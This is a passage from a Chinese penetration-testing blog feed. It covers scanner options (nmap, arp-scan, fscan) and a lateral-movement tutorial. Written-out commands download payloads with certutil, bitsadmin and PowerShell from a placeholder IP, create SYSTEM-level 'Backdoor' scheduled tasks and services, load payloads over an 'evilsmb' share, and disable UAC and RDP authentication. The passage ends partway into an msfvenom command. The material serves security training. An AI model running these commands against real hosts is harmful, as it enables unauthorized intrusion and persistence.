        <content type="html"><![CDATA[<h1 id="Nmap"><a href="#Nmap" class="headerlink" title="Nmap"></a>Nmap</h1><p>参考文章：<a href="https://cloud.tencent.com/developer/article/1933509">https://cloud.tencent.com/developer/article/1933509</a></p><p>参考手册：<a href="https://wizardforcel.gitbooks.io/nmap-man-page/content/index.html">https://wizardforcel.gitbooks.io/nmap-man-page/content/index.html</a></p><p>Nmap用于列举网络主机清单、管理服务升级调度、监控主机或服务运行状况。Nmap可以检测目标机是否在线、端口开放情况、侦测运行的服务类型及版本信息、侦测操作系统与设备类型等信息。</p><p>Nmap包含四项基本功能：</p><ul><li>主机发现 (Host Discovery)</li><li>端口扫描 (Port Scanning)</li><li>版本侦测 (Version Detection)</li><li>操作系统侦测 (Operating System Detection)</li></ul><p>copy一下一些nmap的参数过来</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">nmap –iflist : 查看本地主机的接口信息和路由信息<br>-A ：选项用于使用进攻性方式扫描<br>-T4： 指定扫描过程使用的时序，总有6个级别（0-5），级别越高，扫描速度越快，但也容易被防火墙或IDS检测并屏蔽掉，在网络通讯状况较好的情况下推荐使用T4<br>-oX test.xml： 将扫描结果生成 test.xml 文件，如果中断，则结果打不开<br>-oA test.xml:  将扫描结果生成 test.xml 文件，中断后，结果也可保存<br>-oG test.txt:  将扫描结果生成 test.txt 文件<br>-sn : 只进行主机发现，不进行端口扫描<br>-O : 指定Nmap进行系统版本扫描<br>-sV: 指定让Nmap进行服务版本扫描<br>-p &lt;port ranges&gt;: 扫描指定的端口<br>-sS/sT/sA/sW/sM:指定使用 TCP SYN/Connect()/ACK/Window/Maimon scans的方式来对目标主机进行扫描<br>-sU: 指定使用UDP扫描方式确定目标主机的UDP端口状况<br>-script &lt;script name&gt; : 指定扫描脚本<br>-Pn ： 不进行ping扫描<br>-sP :  用ping扫描判断主机是否存活，只有主机存活，nmap才会继续扫描，一般最好不加，因为有的主机会禁止ping<br>-PI :  设置这个选项，让nmap使用真正的ping(ICMP echo请求)来扫描目标主机是否正在运行。<br>-iL 1.txt : 批量扫描1.txt中的目标地址<br> <br>-sL: List Scan 列表扫描，仅将指定的目标的IP列举出来，不进行主机发现<br>-sY/sZ: 使用SCTP INIT/COOKIE-ECHO来扫描SCTP协议端口的开放的情况<br>-sO: 使用IP protocol 扫描确定目标机支持的协议类型<br>-PO : 使用IP协议包探测对方主机是否开启 <br>-PE/PP/PM : 使用ICMP echo、 ICMP timestamp、ICMP netmask 请求包发现主机<br>-PS/PA/PU/PY : 使用TCP SYN/TCP ACK或SCTP INIT/ECHO方式进行发现<br>-sN/sF/sX: 指定使用TCP Null, FIN, and Xmas scans秘密扫描方式来协助探测对方的TCP端口状态<br>-e eth0：指定使用eth0网卡进行探测<br>-f : --mtu &lt;val&gt;: 指定使用分片、指定数据包的 MTU.<br>-b &lt;FTP relay host&gt;: 使用FTP bounce scan扫描方式<br>-g： 指定发送的端口号<br>-r: 不进行端口随机打乱的操作（如无该参数，nmap会将要扫描的端口以随机顺序方式扫描，以让nmap的扫描不易被对方防火墙检测到）<br>-v 表示显示冗余信息，在扫描过程中显示扫描的细节，从而让用户了解当前的扫描状态<br>-n : 表示不进行DNS解析；<br>-D  &lt;decoy1,decoy2[,ME],...&gt;: 用一组 IP 地址掩盖真实地址，其中 ME 填入自己的 IP 地址<br>-R ：表示总是进行DNS解析。 <br>-F : 快速模式，仅扫描TOP 100的端口 <br>-S &lt;IP_Address&gt;: 伪装成其他 IP 地址<br>--ttl &lt;val&gt;: 设置 time-to-live 时间<br>--badsum: 使用错误的 checksum 来发送数据包（正常情况下，该类数据包被抛弃，如果收到回复，说明回复来自防火墙或 IDS/IPS）<br>--dns-servers  : 指定DNS服务器<br>--system-dns : 指定使用系统的DNS服务器   <br>--traceroute : 追踪每个路由节点 <br>--scanflags &lt;flags&gt;: 定制TCP包的flags<br>--top-ports &lt;number&gt; :扫描开放概率最高的number个端口<br>--port-ratio &lt;ratio&gt;: 扫描指定频率以上的端口。与上述--top-ports类似，这里以概率作为参数<br>--version-trace: 显示出详细的版本侦测过程信息<br>--osscan-limit: 限制Nmap只对确定的主机的进行OS探测（至少需确知该主机分别有一个open和closed的端口）<br>--osscan-guess: 大胆猜测对方的主机的系统类型。由此准确性会下降不少，但会尽可能多为用户提供潜在的操作系统<br>--data-length &lt;num&gt;: 填充随机数据让数据包长度达到 Num<br>--ip-options &lt;options&gt;: 使用指定的 IP 选项来发送数据包<br>--spoof-mac &lt;mac address/prefix/vendor name&gt; : 伪装 MAC 地址<br>--version-intensity &lt;level&gt;: 指定版本侦测强度（0-9），默认为7。数值越高，探测出的服务越准确，但是运行时间会比较长。<br>--version-light: 指定使用轻量侦测方式 (intensity 2)<br>--version-all: 尝试使用所有的probes进行侦测 (intensity 9)<br>--version-trace: 显示出详细的版本侦测过程信息<br>nmap 192.168.1.0/24 -exclude 192.168.1.10  #扫描除192.168.1.0外的该网段的其他地址<br>nmap 192.168.1.0/24 -excludefile f:/1.txt  #扫描除给定文件中的地址以外的其他地址<br>nmap -sF -T4 192.168.1.0 #探测防火墙状态<br></code></pre></td></tr></table></figure><p>更详细的就去看手册学习了，这里就不记录了。</p><h1 id="Arp-scan"><a href="#Arp-scan" class="headerlink" title="Arp-scan"></a>Arp-scan</h1><p>参考文章：<a href="https://www.royhills.co.uk/wiki/index.php/Arp-scan_option_summary%EF%BC%8Chttps://blog.csdn.net/liver100day/article/details/117560828">https://www.royhills.co.uk/wiki/index.php/Arp-scan_option_summary，https://blog.csdn.net/liver100day/article/details/117560828</a></p><p>arp-scan是Kali Linux自带的一款ARP扫描工具。该工具可以进行单一目标扫描，也可以进行批量扫描。批量扫描的时候，用户可以通过CIDR<br>地址范围或者列表文件的方式指定。该工具允许用户定制ARP包，构建非标准数据包。同时，该工具会自动解析Mac地址，给出MAC对应的硬<br>件厂商，帮助用户确认目标。</p><p>这里copy一下常用指令：</p><table><thead><tr><th>参数名</th><th>参数含义</th><th>使用示例</th></tr></thead><tbody><tr><td>-f</td><td>从指定文件中读取主机名或地址</td><td>arp-scan -f ip.txt</td></tr><tr><td>-l</td><td>从网络接口配置生成地址</td><td>arp-scan -l</td></tr><tr><td>-i</td><td>各扫描之间的时间差</td><td>arp-scan -l -i 1000</td></tr><tr><td>-r</td><td>每个主机扫描次数</td><td>arp-scan -l -r 5</td></tr><tr><td>-V</td><td>显示程序版本并退出</td><td>arp-scan -l -V</td></tr><tr><td>-t</td><td>设置主机超时时间</td><td>arp-scan -t 1000 192.168.75.0&#x2F;24</td></tr><tr><td>-L</td><td>使用网络接口</td><td>arp-scan -L eth0</td></tr><tr><td>-g</td><td>不显示重复的数据</td><td>arp-scan -l -g</td></tr><tr><td>-D</td><td>显示数据包往返时间</td><td>arp-scan -l -D</td></tr></tbody></table><h1 id="fscan"><a href="#fscan" class="headerlink" title="fscan"></a>fscan</h1><p>参考文章：<a href="https://cloud.tencent.com/developer/article/1821061">https://cloud.tencent.com/developer/article/1821061</a></p><p>项目地址：<a href="https://github.com/shadow1ng/fscan">https://github.com/shadow1ng/fscan</a></p><p>fscan 是一个内网综合扫描工具，方便一键自动化、全方位漏洞扫描工具。</p><p>它支持主机存活探测、端口扫描、常见服务的爆破、ms17010、redis批量写公钥、计划任务反弹shell、读取win网卡信息、web指纹识别、web漏洞扫描、netbios探测、域控识别等功能。</p><p><strong>kali安装</strong></p><p>要在1.8.2的版本才有Linux的</p><p><img src="https://cdn.jsdelivr.net/gh/clowsman/image@main/image-20240419191321892.png" alt="image-20240419191321892"></p><p>下载之后直接”.&#x2F;fscan_amd64”即可</p><p><strong>简单用法</strong></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">fscan.exe -h 192.168.1.1/24  (默认使用全部模块)<br>fscan.exe -h 192.168.1.1/16  (B段扫描)<br></code></pre></td></tr></table></figure><p>下面扫描试了一下</p><p><img src="https://cdn.jsdelivr.net/gh/clowsman/image@main/image-20240419191600603.png" alt="image-20240419191600603"></p><p>他还会自动去测试开放端口的服务以及尝试一些payload，不过全部扫面就会比较耗时，可以配合一些参数适当跳过，这里贴一下全部参数</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">-c string<br>      ssh命令执行<br>-cookie string<br>      设置cookie<br>-debug int<br>      多久没响应,就打印当前进度(default 60)<br>-domain string<br>      smb爆破模块时,设置域名<br>-h string<br>      目标ip: 192.168.11.11 | 192.168.11.11-255 | 192.168.11.11,192.168.11.12<br>-hf string<br>      读取文件中的目标<br>-hn string<br>      扫描时,要跳过的ip: -hn 192.168.1.1/24<br>-m string<br>      设置扫描模式: -m ssh (default &quot;all&quot;)<br>-no<br>      扫描结果不保存到文件中<br>-nobr<br>      跳过sql、ftp、ssh等的密码爆破<br>-nopoc<br>      跳过web poc扫描<br>-np<br>      跳过存活探测<br>-num int<br>      web poc 发包速率  (default 20)<br>-o string<br>      扫描结果保存到哪 (default &quot;result.txt&quot;)<br>-p string<br>      设置扫描的端口: 22 | 1-65535 | 22,80,3306 (default &quot;21,22,80,81,135,139,443,445,1433,3306,5432,6379,7001,8000,8080,8089,9000,9200,11211,27017&quot;)<br>-pa string<br>      新增需要扫描的端口,-pa 3389 (会在原有端口列表基础上,新增该端口)<br>-path string<br>      fcgi、smb romote file path<br>-ping<br>      使用ping代替icmp进行存活探测<br>-pn string<br>      扫描时要跳过的端口,as: -pn 445<br>-pocname string<br>      指定web poc的模糊名字, -pocname weblogic<br>-proxy string<br>      设置代理, -proxy http://127.0.0.1:8080<br>-user string<br>      指定爆破时的用户名<br>-userf string<br>      指定爆破时的用户名文件<br>-pwd string<br>      指定爆破时的密码<br>-pwdf string<br>      指定爆破时的密码文件<br>-rf string<br>      指定redis写公钥用模块的文件 (as: -rf id_rsa.pub)<br>-rs string<br>      redis计划任务反弹shell的ip端口 (as: -rs 192.168.1.1:6666)<br>-silent<br>      静默扫描,适合cs扫描时不回显<br>-sshkey string<br>      ssh连接时,指定ssh私钥<br>-t int<br>      扫描线程 (default 600)<br>-time int<br>      端口扫描超时时间 (default 3)<br>-u string<br>      指定Url扫描<br>-uf string<br>      指定Url文件扫描<br>-wt int<br>      web访问超时时间 (default 5)<br>-pocpath string<br>      指定poc路径<br>-usera string<br>      在原有用户字典基础上,新增新用户<br>-pwda string<br>      在原有密码字典基础上,增加新密码<br>-socks5<br>      指定socks5代理 (as: -socks5  socks5://127.0.0.1:1080)<br>-sc <br>      指定ms17010利用模块shellcode,内置添加用户等功能 (as: -sc add)<br></code></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> 渗透 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 渗透 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>内网渗透体系建设-内网横向移动</title>
      <link href="/2024/04/11/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E4%BD%93%E7%B3%BB%E5%BB%BA%E8%AE%BE-%E5%86%85%E7%BD%91%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8/"/>
      <url>/2024/04/11/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E4%BD%93%E7%B3%BB%E5%BB%BA%E8%AE%BE-%E5%86%85%E7%BD%91%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8/</url>
      
        <content type="html"><![CDATA[<h1 id="横向移动中的文件传输"><a href="#横向移动中的文件传输" class="headerlink" title="横向移动中的文件传输"></a>横向移动中的文件传输</h1><p>制定文件传输的方案，以便在后续操作过程向攻击目标部署攻击载荷或其他文件。</p><h2 id="通过网络共享"><a href="#通过网络共享" class="headerlink" title="通过网络共享"></a>通过网络共享</h2><p>Windows 系统中的网络共享功能可以实现局域网之间的文件共享。通过提供有效的用户凭据，用户可以很轻松地将文件从一台机器传输到另一台机器。</p><p>执行<strong>net share</strong>命令可以查看Windows系统默认开启的网络共享</p><p><img src="https://cdn.jsdelivr.net/gh/clowsman/image@main/image-20240411004232276.png" alt="image-20240411004232276"></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">C$：C盘共享<br>D$：D盘共享<br>...依次类推<br><br>ADMIN$：系统目录共享<br><br>IPC$(Internet Process Connection)：是共享“命名管道”的资源，为了让进程间通信而开放的命名管道，通过提供可信任的用户名和口令，连接双方可以建立安全的通道并以此通道进行加密数据的交换，从而实现对远程计算机的访问。<br></code></pre></td></tr></table></figure><p>而实战中往往会建立IPC$连接。因为通过IPCS连接，不仅可以进行所有文件共享操作，还可以实现其他远程管理操作，如列出远程主机进程、在远程主机上创建计划任务或系统服务等。</p><p>建立IPC$连接要满足两个条件：</p><ol><li>远程主机开启了IPC连接</li><li>远程主机的139端口和445端口开放</li></ol><p>执行下列命令与远程主机建立IPC连接：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">net use \\&lt;IP/Hostname&gt;\IPC$ &lt;Password&gt; /user:&lt;Username&gt;<br></code></pre></td></tr></table></figure><p>此时执行下列命令可以列出C盘共享目录：</p><figure class="highlight shell"><table><tr><td class="code"><pre><code class="hljs shell">dir \\&lt;IP&gt;\C$<br></code></pre></td></tr></table></figure><p>使用<strong>copy</strong>命令可以通过共享连接向远程主机上复制文件，也可以将远程主机上的文件复制到本地，但需要注意当前用户对远程目录的权限。</p><figure class="highlight shell"><table><tr><td class="code"><pre><code class="hljs shell">copy .\reverse_tcp.exe \\&lt;ip&gt;\C$<br></code></pre></td></tr></table></figure><p>建立其他共享连接也类似，例如C$：</p><figure class="highlight shell"><table><tr><td class="code"><pre><code class="hljs shell">net use \\&lt;IP/Hostname&gt;\C$ &lt;Password&gt; /user:&lt;Username&gt;<br></code></pre></td></tr></table></figure><h2 id="搭建SMB服务器"><a href="#搭建SMB服务器" class="headerlink" title="搭建SMB服务器"></a>搭建SMB服务器</h2><p>SMB(Server Message Block，服务器消息块)，又称 CIFS(Common Internet FileSystem，网络文件共享系统)，由微软开发，基于应用层网络传输协议，主要功能是使网络上的计算机能够共享计算机文件、打印机、串行端口和通新等资源。SMB 消息一般使用 NetBIOS 协议或 TCP 发送，分别使用端口 139 或 445，目前倾向于使用 445 端口。</p><p>实战中可以在测试人员自己的服务器或当前所控内网主机上搭建 SMB 服务器,将需要横向传输的文件如攻击载荷等放入 SMB 服务器的共享目录，并指定UNC路径，让横向移动的目标主机远程加载 SMB 共享的文件。注意，需使用 SMB 匿名共享，并且搭建的SMB服务器能够被横向移动的目标所访问到。</p><p>在Linux上可以使用Impacket项目的smbserver.py来搭建SMB服务器</p><p>执行下面命令搭建一个名为evilsmb，共享目录指向&#x2F;root&#x2F;share的SMB匿名共享</p><figure class="highlight shell"><table><tr><td class="code"><pre><code class="hljs shell">mkdir /root/share<br>python smbserver.py evilsmb /root/share -smb2support<br></code></pre></td></tr></table></figure><p>在Windows上如果获得管理员权限可以手动配置SMB匿名共享，也可以通过Invoke-BuildAnonymousSMBServer快速搭建，项目地址：<a href="https://github.com/3gstudent/Invoke-BuildAnonymousSMBServer">https://github.com/3gstudent/Invoke-BuildAnonymousSMBServer</a></p><h2 id="通过Windows自带工具"><a href="#通过Windows自带工具" class="headerlink" title="通过Windows自带工具"></a>通过Windows自带工具</h2><p><strong>Certutil</strong></p><p>Certutil 是 Windows 自带的命令行工具，用于管理 Windows 证书并作为证书服务的一部分安装。Certutil提供了从网络中下载文件的功能，测试人员可以在远程主机上执行Certutil命令，控制其下载预先部署在可控服务器上的恶意文件，如攻击载荷等。</p><figure class="highlight shell"><table><tr><td class="code"><pre><code class="hljs shell">certutil -urlcache -split -f http://IP:Port/shell.exe C:\reverse_tcp.exe<br></code></pre></td></tr></table></figure><p>通过certutil下载shell.php，并保存为reverse_tcp.exe</p><p><strong>BITSAdmin</strong></p><p>这是Windows7之后自带的命令行工具，可以用于文件上传下载、监控上传进度</p><figure class="highlight shell"><table><tr><td class="code"><pre><code class="hljs shell">bitsadmin /transfer test http://ip:port//shell.exe C:\reverse_tcp.exe<br><span class="hljs-meta prompt_">#</span><span class="language-bash">创建一个名为<span class="hljs-built_in">test</span>的下载任务，将shell.exe下载到本地</span><br></code></pre></td></tr></table></figure><p><strong>PowerShell</strong></p><p>可以通过创建WebClient对象来实现文件下载</p><figure class="highlight shell"><table><tr><td class="code"><pre><code class="hljs shell">(New-Object Net.WebClient).DownloadFile(&quot;http://ip:port/shell.exe&quot;,&quot;C:\reverse_tcp.exe&quot;)<br></code></pre></td></tr></table></figure><h1 id="创建计划任务"><a href="#创建计划任务" class="headerlink" title="创建计划任务"></a>创建计划任务</h1><h2 id="常规利用流程"><a href="#常规利用流程" class="headerlink" title="常规利用流程"></a>常规利用流程</h2><p>创建IPC连接之后，可以在远程主机创建计划任务；在拥有对方管理员凭据的情况下可以实现横向移动</p><p>具体操作流程如下：</p><ol><li><p>利用已建立的共享连接向主机上传攻击载荷</p></li><li><p>利用已建立的IPC连接或指定用户凭据的方式在远程主机创建计划任务</p><figure class="highlight shell"><table><tr><td class="code"><pre><code class="hljs shell">schtasks /Create /S 10.10.10.19 /TN Backdoor /SC minute /MO 1 /TR reverse_tcp.exe /RU System /F<br><span class="hljs-meta prompt_"># </span><span class="language-bash">/S,指定要连接的系统；/TN，指要创建的计划任务的名称；/SC，指计划任务执行的频率</span><br><span class="hljs-meta prompt_"># </span><span class="language-bash">/MO，计划任务执行的周期；/TR，执行的程序路径；/RU，计划任务执行的系统权限；</span><br><span class="hljs-meta prompt_"># </span><span class="language-bash">/F，若任务已存在则强制创建</span><br></code></pre></td></tr></table></figure><p>如果没用建立IPC连接，需要手动指定用户凭据</p><figure class="highlight shell"><table><tr><td class="code"><pre><code class="hljs shell">schtasks /Create /S 10.10.10.19 /TN Backdoor /SC minute /MO 1 /TR reverse_tcp.exe /RU System /F /U Administrator /P Admin@123<br></code></pre></td></tr></table></figure></li><li><p>执行下面命令启动计划任务,也可以等待计划任务自己启动</p><figure class="highlight shell"><table><tr><td class="code"><pre><code class="hljs shell">schtasks /RUN /S 10.10.10.19 /I /TN Backdoor<br></code></pre></td></tr></table></figure></li><li><p>执行下面命令删除计划任务</p><figure class="highlight shell"><table><tr><td class="code"><pre><code class="hljs shell">schtasks /Delete /S 10.10.10.19 /TN Backdoor /F<br></code></pre></td></tr></table></figure></li></ol><p>还可以通过写计划任务执行系统命令，并将结果写入文件保存</p><figure class="highlight shell"><table><tr><td class="code"><pre><code class="hljs shell">schtasks /Create /S 10.10.10.19 /TN Backdoor /SC minute /MO 1 /TR &quot;C:\Windows\System32\cmd.exe /c &#x27;whoami &gt; C:\result.txt&#x27;&quot; /RU System /F<br></code></pre></td></tr></table></figure><h2 id="UNC路径加载执行"><a href="#UNC路径加载执行" class="headerlink" title="UNC路径加载执行"></a>UNC路径加载执行</h2><p>Windows中使用UNC路径来访问共享资源，格式如下：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">\\servername\sharename\directory\filename<br></code></pre></td></tr></table></figure><blockquote><p>servername为主机名，sharename为网络共享名称，directory和filename为共享下的目录和名称</p></blockquote><p>通过该方法可以省去上传攻击载荷的步骤，直接用UNC路径代替本地路径，让远程主机直接加载测试人员搭建的SMB匿名服务器上的共享目录下的攻击载荷</p><p>这里以创建计划任务示例，创建其他任务来加载文件的形式一样</p><figure class="highlight shell"><table><tr><td class="code"><pre><code class="hljs shell">schtasks /Create /S 10.10.10.19 /TN Backdoor /SC minute /MO 1 /TR \\192.168.2.143\evilsmb\reverse_tcp.exe /RU System /F /U Administrator /P Admin@123<br></code></pre></td></tr></table></figure><h1 id="利用系统服务"><a href="#利用系统服务" class="headerlink" title="利用系统服务"></a>利用系统服务</h1><h2 id="创建远程服务"><a href="#创建远程服务" class="headerlink" title="创建远程服务"></a>创建远程服务</h2><p>除了创建计划任务，测试人员还可以通过在远程主机上创建系统服务的方式，在远程主机上运行指定的程序或命令。该方式需要拥有两端主机的管理员权限和IPC$连接，具体操作如下：</p><ol><li><p>利用已建立的共享连接上传攻击载荷</p></li><li><p>利用已建立的IPC连接创建系统任务</p><figure class="highlight shell"><table><tr><td class="code"><pre><code class="hljs shell">sc \\10.10.10.19 create Backdoor binpath= &quot;cmd.exe /k C:\reverse_tcp.exe&quot;<br><span class="hljs-meta prompt_"># </span><span class="language-bash">binpath，指定服务启动时运行的二进制文件，<span class="hljs-string">&quot;=&quot;</span>后面有一个空格</span><br></code></pre></td></tr></table></figure></li><li><p>启动该服务</p><figure class="highlight shell"><table><tr><td class="code"><pre><code class="hljs shell">sc \\10.10.10.19 start Backdoor<br></code></pre></td></tr></table></figure></li><li><p>攻击成功后，删除创建的任务</p><figure class="highlight shell"><table><tr><td class="code"><pre><code class="hljs shell">sc \\10.10.10.19 delete Backdoor<br></code></pre></td></tr></table></figure></li></ol><h2 id="SCShell"><a href="#SCShell" class="headerlink" title="SCShell"></a>SCShell</h2><p>SCShell是一款利用系统服务的无文件横向移动工具。</p><p>跟传统创建系统任务不同的是，SCShell 利用提供的用户凭据，通过ChangeServiceConfigA API修改远程主机上的服务配置，将服务的二进制路径名修改为指定的程序或攻击载荷，然后重启服务。执行结束后，服务二进制路径将恢复为原始路径</p><p>SCShell 需要提供远程主机的管理员权限用户的凭据，并且需要已知远程主机上的系统服务名称。方法如下：</p><figure class="highlight shell"><table><tr><td class="code"><pre><code class="hljs shell">SCShell.exe 10.10.10.19 XblAuthManager &quot;C:\Windows\System32\cmd.exe /c calc&quot; hacke-my.com Administrator Admin@123<br><span class="hljs-meta prompt_"># </span><span class="language-bash">SCShell.exe &lt;target&gt; &lt;Service Name&gt; &lt;Payload&gt; &lt;Username&gt; &lt;Password&gt;</span><br></code></pre></td></tr></table></figure><h2 id="UAC-Remote-Restrictions"><a href="#UAC-Remote-Restrictions" class="headerlink" title="UAC Remote Restrictions"></a>UAC Remote Restrictions</h2><p>为了更好地保护属于本地管理员组成员的用户，微软在 Windows Vista 以后的操作系统中引入了 UACRemote Restrictions(远程限制)。此机制有助于防止本地恶意软件以管理权限远程运行。</p><p>因此，如果测试人员使用计算机本地用户进行需要管理员权限的远程管理操作，无论是schtasks还是PsExec、WMI、WinRM、哈希传递攻击等，都只能使用RID 500的本地管理员用户才行，使用其他任何用户包括非RID 500用户都会提示<strong>拒绝访问</strong>。</p><p>注意，UAC Remote Restrictions只限制本地用户，域管理员用户不受限制，因此会在很大程度上限制工作组环境中的横向移动。</p><p>如果有权限的话可以通过下面命令来重启系统关闭UAC Remote Restrictions：</p><figure class="highlight shell"><table><tr><td class="code"><pre><code class="hljs shell">reg add &quot;HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System&quot; /v LocalAccountTokenFilterPolicy /t REG_DWORD /d 1 /f<br></code></pre></td></tr></table></figure><h1 id="远程桌面利用"><a href="#远程桌面利用" class="headerlink" title="远程桌面利用"></a>远程桌面利用</h1><p>远程桌面协议(Remote Desktop Protocol，RDP)是微软从 Windows Server 2000 开始提供的功能，用户可以通过该功能登录并管理远程主机，所有操作就像在自己的计算机上操作一样。远程桌面协议默认监听 TCP 3389 端口。</p><p>可以利用远程桌面服务对目标主机进行实时操作，但是这种方法可能将已登录的用户强制退出，容易被管理员发现。</p><h2 id="远程桌面的确定和开启"><a href="#远程桌面的确定和开启" class="headerlink" title="远程桌面的确定和开启"></a>远程桌面的确定和开启</h2><figure class="highlight shell"><table><tr><td class="code"><pre><code class="hljs shell">reg query &quot;HKLM\SYSTEM\CurrentControlSet\Control\Terminal Server&quot; /v fDenyTSConnections<br></code></pre></td></tr></table></figure><p>上面命令通过查询注册表来确定当前主机是否开启了远程桌面功能，若字段为0，则说明RDP服务已经启动，若为1，则说明禁用。</p><p><img src="https://cdn.jsdelivr.net/gh/clowsman/image@main/image-20240415001846792.png" alt="image-20240415001846792"></p><p>执行下面命令可以开启远程桌面功能：</p><figure class="highlight shell"><table><tr><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_"># </span><span class="language-bash">开启远程桌面连接</span><br>reg add &quot;HKLM\SYSTEM\CurrentControlset\control\Terminal Server&quot; /v fDenyTSconnections /t REG_DWORD /d 0 /f<br><span class="hljs-meta prompt_"># </span><span class="language-bash">关闭“仅允许运行使用网络级别身份验证的远程桌面的计算机连接”(鉴权)</span><br>reg add &quot;HKLM\SYSTEM\CurrentControlset\control\Terminal Server\WinStations\RDP-Tcp&quot; /v UserAuthentication /t REG_DWORD /d 0 /f<br><span class="hljs-meta prompt_"># </span><span class="language-bash">设置防火墙策略放行3389端口</span><br>netsh advfirewall firewall add rule name=&quot;Remote Desktop&quot; protocol=TCP dir=in localport=3389 action=allow<br></code></pre></td></tr></table></figure><p>对于远程主机，可以通过WMI来开启远程桌面功能,不过需要指定远程主机的IP、主机名和用户凭据：</p><figure class="highlight shell"><table><tr><td class="code"><pre><code class="hljs shell">wmic /Node:10.10.10.19 /User:Administrator /Password:Admin@123 RDTOGGLE WHERE ServerName=&#x27;WIN2016-WEB3&#x27; call SetAllowTSConnections 1<br></code></pre></td></tr></table></figure><h2 id="RDP-Hijacking"><a href="#RDP-Hijacking" class="headerlink" title="RDP Hijacking"></a>RDP Hijacking</h2><h2 id="SharpRDP"><a href="#SharpRDP" class="headerlink" title="SharpRDP"></a>SharpRDP</h2><p>SharpRDP 是一款开源工具，可以通过远程桌面协议在远程主机上执行系统命令，且不需 GUI 客户端。该工具需要远程主机开启远程桌面功能，并且防火墙放行 3389 端口。</p><p>通常在内网渗透时，如果想登录一台内网主机的远程桌面，需要先搭建内网代理然后使用 RDP 客户端进行连接。但是，测试人员可以直接将 SharpRDP 上传到跳板机，然后用获取到的用户凭据，对内网其他主机执行系统命令。这样就省去了内网代理等中间环节。</p><h1 id="PsExec-远程控制"><a href="#PsExec-远程控制" class="headerlink" title="PsExec 远程控制"></a>PsExec 远程控制</h1><p>PsExec 是微软官方提供的一款实用的 Windows 远程控制工具，可以根据凭据在远程系统上执行管理操作，并且可以获得与命令行几乎相同的实时交互性。PsExec最强大的功能之一就是可以在远程系统中启动交互式命令提示窗口，以便实时显示有关远程系统的信息。</p><p>PsExec 原理是通过SMB连接到服务端的Admin$共享，并释放名为“psexesvc.exe的二进制文件，然后注册名为“PSEXESVC”服务。当客户端执行命令时，服务端通过PSEXESVC服务启动相应的程序执行命令并回显数据。运行结束后，PSEXESVC服务会被删除。</p><p>使用PsExec进行操作需要两个条件：</p><ol><li>远程主机开启了Admin$共享</li><li>远程主机未开启防火墙或者放行445端口</li></ol><p>满足条件执行下面命令，用域管理员的账户连接远程主机，并以SYSTEM权限启动一个交互式命令行</p><figure class="highlight shell"><table><tr><td class="code"><pre><code class="hljs shell">PsExec.exe -accepteula \\10.10.10.19 -u HACK-MY\Administrator -p Admin@123 -s cmd.exe<br><span class="hljs-meta prompt_">#</span><span class="language-bash">-accepteula，禁止弹出许可证对话框;-u，指定远程主机的用户名;-p，指定用户的密码</span><br><span class="hljs-meta prompt_">#</span><span class="language-bash">-s，以 SYSTEM权限启动进程，如果未指定该参数，就将以管理员权限启动进程</span><br></code></pre></td></tr></table></figure><p>如果已有相应凭据，可以直接使用PsExec连接远程主机</p><figure class="highlight shell"><table><tr><td class="code"><pre><code class="hljs shell">PsExec.exe -accepteula \\10.10.10.19 cmd.exe<br></code></pre></td></tr></table></figure><h1 id="WMI的利用"><a href="#WMI的利用" class="headerlink" title="WMI的利用"></a>WMI的利用</h1><p>WMI(Windows Management Instrumentation，Windows 管理规范)是一项核心的Windows 管理技术。用户可以通过 WMI 管理本地和远程计算机。Windows 为远程传输WMI数据提供了两个可用的协议,即分布式组件对象模型(Distributed Component Object Model，DCOM)和 Windows远程管理(Windows Remote Management，WinRM)，使得WMI对象的查询、事件注册、WMI类方法的执行和类的创建等操作都能够远程进行。</p><p>在横向移动时，测试人员可以利用WMI提供的管理功能，通过已获取的用户凭据，与本地或远程主机进行交互，并控制其执行各种行为。目前有两种常见的利用方法:<strong>一是通过调用 WMI 的类方法进行远程执行</strong>,如 Win32 Process 类中的 Create 方法可以在远程主机上创建进程,Win32 Product类中的Install方法可以在远程主机上安装恶意的MSI<strong>二是远程部署WMI事件订阅，在特定条的事件发生时触发攻击。</strong></p><p>利用WMI横向移动需要两个条件：</p><ol><li>远程主机的WMI服务为开启状态(默认开启)</li><li>远程主机防火墙放行135端口，这是WMI默认的管理端口</li></ol><h2 id="常规利用方法"><a href="#常规利用方法" class="headerlink" title="常规利用方法"></a>常规利用方法</h2><p>在 Windows 上可以通过wmic.exe和PowerShell Cmdlet来使用 WMI数据和执行 WMI方法。</p><p>Windows PowerShell 也提供了许多可以与 WMI进行交互的Cmdlet，如Invoke-WmiMethod、Set-Wmilnstance 等。</p><p><strong>执行远程查询</strong></p><p>查询远程主机进程信息</p><figure class="highlight shell"><table><tr><td class="code"><pre><code class="hljs shell">wmic /node:10.10.10.19 /user:Administrator /password:Admin@123 process list brief<br></code></pre></td></tr></table></figure><p><strong>创建远程进程</strong></p><p>通过调用 Win32_Process.Create方法在远程主机上创建进程,启动CMD 来执行系统命令</p><figure class="highlight shell"><table><tr><td class="code"><pre><code class="hljs shell">wmic /node:10.10.10.19 /user:Administrator /password:Admin@123 process call create<br>&quot;cmd.exe /c ipconfig &gt; C\:result.txt&quot;<br></code></pre></td></tr></table></figure><p>由于 WMIC 在执行命令时没有回显，因此可以将执行结果写入文件，然后通过建立共享连接等方式使用 type 命令远程读取。</p><p><strong>远程安装MSI文件</strong></p><p>通过调用 Win32 Product.Install 方法，可以控制远程主机安装恶意的 MSI(MicrosoftInstaller)文件，从而获取其权限。</p><ol><li><p>使用Metasploit生成一个恶意的MSI文件</p><figure class="highlight shell"><table><tr><td class="code"><pre><code class="hljs shell">msfvenom -p 